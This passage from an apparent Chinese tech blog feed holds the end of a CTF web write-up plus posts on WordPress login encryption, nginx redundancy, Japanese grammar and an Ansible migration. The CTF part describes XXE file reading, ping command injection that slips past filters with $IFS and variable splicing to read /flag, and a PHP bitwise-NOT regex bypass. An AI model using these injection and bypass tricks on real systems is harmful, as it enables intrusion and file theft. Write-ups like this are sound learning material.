alt="img"><br>提交过去发现不是admin，改好cookie后即可获得flag{xxasdasdd_for}<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C218.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C218.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="2-Web-–-XX？"><a href="#2-Web-–-XX？" class="headerlink" title="2. Web – XX？"></a>2. Web – XX？</h3><p>看到题目就想到了xxe，先访问网站发现网站的标题为gedit</p><p><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C262.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C262.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C264.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C264.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>然后网上搜了下发现gedit在写完文件后，默认会产生一个以~结尾的备份文件名<br>例如：index.php~。这可用于从服务器中提取源代码/文件。然后御剑扫描发现有三个文件，于是访问index.php~得到源码。哦豁，果然是xxe。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C383.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C383.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>我有一个大胆的想法，flag.php会不会也有呢？<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C412.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C412.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>好吧，没有。那我们继续外部实体注入攻击，结合扫描出来的flag.php，得到base64编码。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C462.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C462.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>解码可得flag{IUyasd8213123123890}<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C495.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C495.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="3-免费的-ping一下"><a href="#3-免费的-ping一下" class="headerlink" title="3. 免费的,ping一下~"></a>3. 免费的,ping一下~</h3><p>结合题目和页面，是php ping命令执行无误了，ls一下，果然是这样。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C547.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C547.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>然后尝试ls一下根目录，发现waf过滤敏感字符了。于是测试被过滤掉的是空格还是“/“斜杠。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C595.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C595.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>结合网上搜一下，得知中有个变量叫IFS(Internal Field Seprator) ,内部域分隔符，即空格。代替原来的成功执行了。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C666.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C666.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>继续ls得知原来是空格被waf过滤掉了。嘿嘿，那就是可以cat /flag啦，执行以下，然后得知cat 或flag关键字又被过滤了。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C735.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C735.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>由于我偶尔会编写shell脚本，想到用变量拼接可以绕过关键字的过滤。然后一顿猛如虎的操作，结果被告知flag不在第一行。而且他只能显示部分内容。。。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C812.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C812.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>最后使用tail -n 1 /flag 成功获取flag{llllll_U_GeT_Th3_fl4g}<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C867.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C867.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="4-php"><a href="#4-php" class="headerlink" title="4. php"></a>4. php</h3><p>访问页面得到一个apache的欢迎页面，于是直接用御剑扫，得到三个文件<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C910.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C910.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>访问index.php得知本题为条件绕过型题目。第一眼看过去整个人傻了，无数字字母还好说，可以用异或^，左右移等等去绕过。然后发现取反和自增可以绕过，但是长度只有27，太苛刻了。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1002.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1002.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>于是想到，如果这个是php7，那么就可以利用php7的新特性，即可以通过($function)();的方式动态执行函数。<br><a href="https://www.php.net/manual/zh/migration70.incompatible.php">https://www.php.net/manual/zh/migration70.incompatible.php</a><br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1199.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1199.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>取反~符号可以把字母数字符号等等变为不可见字符，就可以轻松绕过正则了，为了被成功解析，使用urlencode一下。</p><p>先copy下来，本地测试，注释掉错误回显，方便调试。先试试phpinfo测试一下，通过 echo urlencode(~”phpinfo”)构造一下。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1337.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1337.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>加上(~exp)(); 试试，就发现可以在题目环境中成功执行，接下来就简单了。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1381.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1381.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>构造 GetYourFlag调用GetYouFlag()<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1414.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1414.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1416.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1416.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>OK，接下来<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1426.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1426.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>最后发现flag{3904c5df2e894ca02a21004feb21e617} 在源码中。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1479.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1479.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctf比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctf比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress后台登录密码前端js加密+php后端解密</title>
      <link href="//p/2019/wordpress%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%8A%A0%E5%AF%86/"/>
      <url>//p/2019/wordpress%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>由于特殊原因，wordpress后台登录密码不能被明文抓包…<br>于是我采用 rsa 前端 js 加密 + php 后端解密 的方式进行</p><p>那只能大费周章去改wordpress代码了= = 。。。。</p><p>由于 wordpress 登录时 wp-login.php 是直接提交表单给自己的<br>于是想到用 jquery 去修改表单数据， 直接上代码。</p><h4 id="wordpress根目录-wp-login-php-文件"><a href="#wordpress根目录-wp-login-php-文件" class="headerlink" title="wordpress根目录 wp-login.php 文件"></a>wordpress根目录 wp-login.php 文件</h4><p>此处需要用到两个库文件 <a href="https://code.jquery.com/jquery-3.4.1.min.js">jQuery</a> 和 <a href="https://github.com/travist/jsencrypt">jsencrypt</a><br>在表单代码后面的 js 处 添加</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./wp-includes/js/jquery/jquery-3.4.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./wp-includes/js/jsencrypt.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="javascript"> * writeBy：TARI</span></span></span><br><span class="line"><span class="comment"><span class="javascript"> * date: 2019/08/26</span></span></span><br><span class="line"><span class="comment"><span class="javascript"> * usage: $(&quot;#user_pass&quot;).change方法对密码进行 rsa 公钥加密传输</span></span></span><br><span class="line"><span class="comment"><span class="javascript">*/</span></span></span><br><span class="line"><span class="javascript">$(<span class="string">&quot;#user_pass&quot;</span>).change(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//失去焦点触发，就是点击登陆按钮后触发</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// 数据处理</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> pubkey = <span class="string">&#x27;你的公钥&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> encrypt = <span class="keyword">new</span> JSEncrypt();</span></span><br><span class="line"><span class="javascript">encrypt.setPublicKey(pubkey);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> encrypted = encrypt.encrypt($(<span class="string">&#x27;#user_pass&#x27;</span>).val())</span></span><br><span class="line"><span class="javascript"> $(<span class="string">&quot;#user_pass&quot;</span>).val(encrypted);<span class="comment">//重新赋值</span></span></span><br><span class="line"><span class="javascript">&#125;);</span></span><br><span class="line"><span class="javascript">&lt;!-- 下面还有wp_attempt_focus()等函数， 或者新建一对 js 标签也行，不过我没测试过 --&gt;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="wordpress根目录-wp-includes-pluggable-php-文件"><a href="#wordpress根目录-wp-includes-pluggable-php-文件" class="headerlink" title="wordpress根目录/wp-includes/pluggable.php 文件"></a>wordpress根目录/wp-includes/pluggable.php 文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_authenticate</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = sanitize_user(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = trim(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里后添加如下代码：</span></span><br><span class="line"><span class="comment">// 私钥不能因为好看而添加乱七八糟的缩减之类的</span></span><br><span class="line"><span class="variable">$private_key</span> = <span class="string">&quot;私钥内容&quot;</span>;</span><br><span class="line"><span class="variable">$decrypt_data</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// 判断私钥是否是可用的，可用返回资源id</span></span><br><span class="line"><span class="variable">$pi_key</span> =  openssl_pkey_get_private(<span class="variable">$private_key</span>);</span><br><span class="line"><span class="comment">// 解密数据, 这里要进行 base64 解码是因为浏览器会默认帮你的数据进行编码</span></span><br><span class="line">openssl_private_decrypt(base64_decode(<span class="variable">$password</span>), <span class="variable">$decrypt_data</span>, <span class="variable">$private_key</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$decrypt_data</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面一堆代码 balabala</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再抓包密码就是加密状态啦！<br>在 wordpress 找密码验证的函数和文件找了挺久的….</p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> Wordpress </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> Wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx双冗余及负载均衡搭建</title>
      <link href="//p/2019/Redundancy%20and%20load%20balancing/"/>
      <url>//p/2019/Redundancy%20and%20load%20balancing/</url>
      
        <content type="html"><![CDATA[<h3 id="nginx-双冗余"><a href="#nginx-双冗余" class="headerlink" title="nginx 双冗余"></a>nginx 双冗余</h3><p><a href="https://github.com/TARI0510/webAnsible/tree/master/roles/keepalived">nginx 冗余安装脚本链接</a><br>配置文件的 <a href="#">链接在此</a></p><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="**注意事项**"></a>**注意事项**</h4><ul><li><p>/etc/selinux/config<br>SELINUX=off</p></li><li><p>感觉线上和线下一个比较大的区别就在防火墙，线下可以的在被这个卡了半天</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eth0 该字段根据网卡类型来定义</span></span><br><span class="line">firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface eth0 --destination 224.0.0.18 --protocol vrrp -j ACCEPT</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure></li><li><p>这个ip转发用不用就忘了测试了，如果开启防火墙还不行就试试吧。<br>echo “net.ipv4.ip_forward = 1” &gt;&gt; /etc/sysctl.conf</p></li></ul><ul><li><p>如果没装 zlib zlib-devel openssl 的记得安装喔！</p></li><li><p>*** WARNING - this build will not support IPVS with IPv6. Please install libnl/libnl-3 dev libraries to support IPv6 with IPVS.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install libnl libnl-devel</span><br></pre></td></tr></table></figure></li></ul><h3 id="nginx-负载均衡"><a href="#nginx-负载均衡" class="headerlink" title="nginx 负载均衡"></a>nginx 负载均衡</h3><p>nginx 配置文件内</p><pre><code>upstream yourname &#123;    yourip;&#125;location / &#123;    proxy_pass http://yourname;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>「量詞」</title>
      <link href="//p/2019/%E3%80%8C%E9%87%8F%E8%A9%9E%E3%80%8D/"/>
      <url>//p/2019/%E3%80%8C%E9%87%8F%E8%A9%9E%E3%80%8D/</url>
      
        <content type="html"><![CDATA[<ul><li><table><thead><tr><th align="center">-</th><th align="center">–&gt;</th><th align="center">–&gt;</th><th align="center">-</th></tr></thead><tbody><tr><td align="center">１ いち</td><td align="center">か　さ　た　は　行</td><td align="center">いっ</td><td align="center">枚、回、台、歳</td></tr><tr><td align="center">６ ろく</td><td align="center">か　さ　た　は　行</td><td align="center">ろっ</td><td align="center">枚、回、台、歳</td></tr><tr><td align="center">８ はち</td><td align="center">か　　　　　は　行</td><td align="center">はっ</td><td align="center">枚、回、台、歳</td></tr><tr><td align="center">１０ じゅう</td><td align="center">か　さ　た　は　行</td><td align="center">じゅっ</td><td align="center">枚、回、台、歳</td></tr></tbody></table></li></ul><p>例：リンゴを<u>三つ</u>買いました<br>&emsp;&emsp;写真を<u>3枚</u>撮りました<br>&emsp;&emsp;蜜柑を<u>８つ</u>食べました</p><ul><li><p>昨日は4時間<u>しか</u>寝<u>ません</u>でした<br>しか + ませんでした　要翻訳成肯定</p></li><li><p>[量詞] + も　強調 [重 厚 長 大 多]<br>ケーキを8個<u>も</u>食べました</p></li><li><p>[量詞] + しか　強調 [軽 薄 短 小 少]<br>財布に１０元<u>しか</u>あり<u>ません</u></p></li><li><p>[量詞]　だけ zhiyou~ 10分<u>だけ</u>休みましょう</p></li><li><p>[量詞]　ぐらい ~左右　財布に１０元<u>ぐ(く)らい</u>あります</p></li><li><p>[量詞]　は zhishao~ 財布に１０００元<u>は</u>あります</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 勉強 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 勉強 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web站群从Ubuntu14.04迁移至CentOS7</title>
      <link href="//p/2019/ansible-shell/"/>
      <url>//p/2019/ansible-shell/</url>
      
        <content type="html"><![CDATA[<p><a href="#nfs">nfs迁移</a></p><h3 id="系统环境-CentOS-7-x86-64-Minimal-1511"><a href="#系统环境-CentOS-7-x86-64-Minimal-1511" class="headerlink" title="系统环境: CentOS-7-x86_64-Minimal-1511"></a>系统环境: CentOS-7-x86_64-Minimal-1511</h3><p>相关的剧本和脚本可以 <a href="https://github.com/TARI0510/ansible">参考我的github</a></p><p><a href="https://github.com/TARI0510/webAnsible/tree/master/mysh/common.sh">common.sh 为公用脚本，包含公用模块</a></p><h3 id="服务器备份"><a href="#服务器备份" class="headerlink" title="服务器备份"></a>服务器备份</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook srvs_backup_role.yml</span><br></pre></td></tr></table></figure><p>出现问题: </p><pre><code>failed: [192.168.206.132] (item=baseVersionBackup.sh) =&gt; &#123;&quot;changed&quot;: false, &quot;checksum&quot;: &quot;fe2fab79a66b8f5489418fd7b556cdbb74abcac6&quot;, &quot;item&quot;: &quot;baseVersionBackup.sh&quot;, &quot;msg&quot;: &quot;Aborting, target uses selinux but python bindings (libselinux-python) aren&#39;t installed!&quot;&#125;failed: [192.168.206.132] (item=common.sh) =&gt; &#123;&quot;changed&quot;: false, &quot;checksum&quot;: &quot;b8554aa38d74846821d3575eaf72854f2eb40338&quot;, &quot;item&quot;: &quot;common.sh&quot;, &quot;msg&quot;: &quot;Aborting, target uses selinux but python bindings (libselinux-python) aren&#39;t installed!&quot;&#125;</code></pre><p>这个问题主要是由 SELinux（Security-Enhanced Linux）引起的.  CentOS7 一般自带 libselinux-python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 没有的话可以安装一下</span></span><br><span class="line">yum -y install libselinux-python</span><br></pre></td></tr></table></figure><p>由于我不大了解它, 干脆就把它的禁用了, 记得在目标主机禁用喔..</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 